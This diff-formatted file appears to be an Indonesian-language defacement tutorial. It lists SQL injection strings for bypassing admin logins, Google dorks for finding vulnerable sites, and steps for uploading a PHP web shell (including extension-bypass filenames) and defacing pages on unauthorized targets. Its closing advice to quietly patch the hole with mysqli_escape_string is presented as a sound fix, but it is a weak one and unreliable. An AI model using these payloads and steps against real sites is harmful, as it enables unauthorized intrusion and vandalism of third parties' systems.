@@ -1,0 +1,142 @@
+-------------------------------------------------------------------------------- ./ByF4lkuXploit --------------------------------------------------------------------------------
+
+
+
+Payload Bypass Admin
+Dari sekian banyak query yang bertebaran di internet, disini saya akan membagikan beberapa query yang sering saya gunakan untuk bypass admin login website, diantaranya sebagai berikut:
+
+admin' #
+
+ 
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or 1=1 or ''='
+'or 1=1 limit 1 -- -+
+' or '1'='1
+' or 'x'='x
+' or 0=0 --
+' or 0=0 #
+' or 1=1--
+' or 'one'='one
+
+ 
+'or 1=1-- -
+'or''='
+
+Hanya segitu? Iya cuma itu saja, payload bypass admin login tersebut saya gunakan dari awal saya mengenal/melakukan deface (2015) sampai sekarang (tapi sudah jarang sekali). Nah, jika kamu punya payload yang lain mungkin bisa di share pada kolom komentar biar teman-teman yang lain juga pada tahu.
+
+Baiklah tanpa berlama-lama, sekarang mari kita ke inti pokok pembahasan selanjutnya, lestgooo.
+
+
+
+Tutorial Bypass Admin Login Website
+Nah, apa saja yang diperlukan? Berikut diantaranya:
+
+1. Dork
+2. Shell Backdoor
+3. Script Deface
+
+Penjelasan:
+Dork~ Jika tidak punya target kamu bisa mencari website yang terkait vulnerability bypass admin login dengan dork, contoh dork misalnya.
+
+"inurl:/admin/login.php"
+"inurl:/admin/login.php" site:.id
+
+Tutorial Bypass Admin Login Website
+Nah, apa saja yang diperlukan? Berikut diantaranya:
+
+1. Dork
+2. Shell Backdoor
+3. Script Deface
+
+Penjelasan:
+Dork~ Jika tidak punya target kamu bisa mencari website yang terkait vulnerability bypass admin login dengan dork, contoh dork misalnya.
+
+"inurl:/admin/login.php"
+"inurl:/admin/login.php" site:.id
+
+
+
+
+
+POC (Prof End Concept) Bypass Admin Login
+Step 1: Eksekusi Target
+
+Hasil dari mencari target dengan dork, kurang lebih seperti ini target yang saya dapatkan.
+
+http://target.com/admin/index.php
+
+Nah sekarang, tinggal mengeksekusi website tersebut bisa atau tidaknya saya dapat masuk ke dashboard panel admin dengan menggunakan payload yang tadi saya sebutkan diatas dan saya mencoba menggunakan payload yang admin' or 1=1 or ''='
+
+Disaat berada di dashboard panel admin login, kamu isikan username: admin' or 1=1 or ''=' password: admin' or 1=1 or ''='
+Kemudian tinggal klik pada tombol Login website tersebut. Apabila berhasil kamu akan diarahkan menuju ke menu dashboard panel admin website tersebut, dan itu artinya kamu sudah bisa mengakses seluruh isi website.
+Catatan: Perlu di ingat, tidak semua form login admin website bisa di injeksi dengan cara seperti ini, jika gagal kemungkinan sudah di patch bugnya, kamu bisa coba payload yang lain atau cari target yang lainya saja.
+
+Step 2: Upload Shell
+
+Jika kamu sudah berhasil masuk ke dashboard panel admin website target kamu itu artinya sekarang kamu sudah bisa upload shell, edit artikel dan lain sebagainya.
+
+Lalu bagaimana caranya upload shell backdoor?
+
+Tips: Jika kita tidak bisa upload shell backdoor dikarenakan form upload tersebut hanya memperbolehkan upload file berformat ".jpg, .gif, .jpeg" kita bisa mengakalinya dengan bypass extensi shell tersebut. Contoh misalnya seperti ini "shell.php.jpg, shell.jpg.php, shell.jpg.PhP" dan lain sebagainya.
+
+Dan untungnya pada target saya tidak terlalu ribet harus ini itu untuk upload shell backdoornya alias tidak ada masalah sama sekali, kira-kira kalau saya jelaskan proses atau alur upload shellnya begini.
+
+Cari tempat upload > tempat upload ketemu di bagian menu partners > kemudian tinggal upload shell backdoor extensi .php > Done tanpa harus bypass shell.
+
+Step 3: Deface
+
+Oke, setelah berhasil menanam shell backdoor pada website target. Langkah selanjutnya kita tinggal upload file script deface, jika ingin menebas index.php tinggal cari aja di bagian directory home page website tersebut. Tapi disini saya hanya menitipkan file saja tidak mengganti file index.php sama sekalipun.
+
+Gimana menurut kamu mudah bukan? Jangan lupa untuk mencobanya sendiri ya tapi tidak boleh berlebihan, dikarenakan berbahaya.
+
+Lanjut aja yukk.
+
+Ada baiknya kalau kita setelah melakukan deface website tersebut, kita juga bisa membantu mereka dengan menutup atau patch bug bypass admin login tanpa harus melaporkan terlebih dahulu, cukup lakukan secara diam-diam dan anggap saja ini sebagai bonus dari kamu gitu deh, heker baik hati wkwkk.
+
+Untuk caranya simak penjelasan singkat berikut ini.
+
+
+
+
+
+Cara Patch Bug Bypass Admin Login
+
+Sebenarnya untuk cara melakukan patch bug bypass admin pada website itu sangat mudah, kamu hanya cukup dengan menambahkan perintah mysqli_escape_string.
+
+Berikut ini contoh source kode yang memiliki vulnerability bypass admin login, saya akan ambil bagian tertentu saja ya.
+
+
+
+
+<?php
+$message = "";
+if(isset($_POST['submit'])) {
+$username = ($_POST['username']);
+$password = ($_POST['password']);
+kode bla bla bla
+kode bla bla bla
+kode bla bla bla
+} else {
+$message = "Username and Password is not matched";
+}
+}
+?>
+
+Jika kita pahami pada source kode diatas, berikut ini adalah kode dimana yang menjadi masalah yaitu bisa di bypass admin login.
+
+$username = ($_POST['username']);
+$password = ($_POST['password']);
+
+Penjelasan begini, kita tahu bahwa kode tersebut tidak ada filterisasi karakter yang mengakibatkan adanya bug dimana seorang attacker bisa dapat memasukan query injeksi dan dapat masuk ke dashboard panel admin suatu website.
+
+Nah, maka dari itu kita tambahkan saja kode atau fungsi mysqli_escape_string di bagian kode yang dapat menyebabkan bug tadi, jika digabungkan caranya seperti ini kodenya.
+
+$username = mysqli_escape_string($con, $_POST['username']);
+$password = mysqli_escape_string($con, $_POST['password']);
+
+Sudah paham kan caranya? Jika sudah, Bagus deh!
+
+Jadi setelah menambahkan filter pada bagian kode $username dan $password dengan fungsi mysqli_escape_string tersebut, seorang attacker tidak akan bisa menginjeksi admin login, mantap haha.
+
+Selamat mencoba, enjoy...
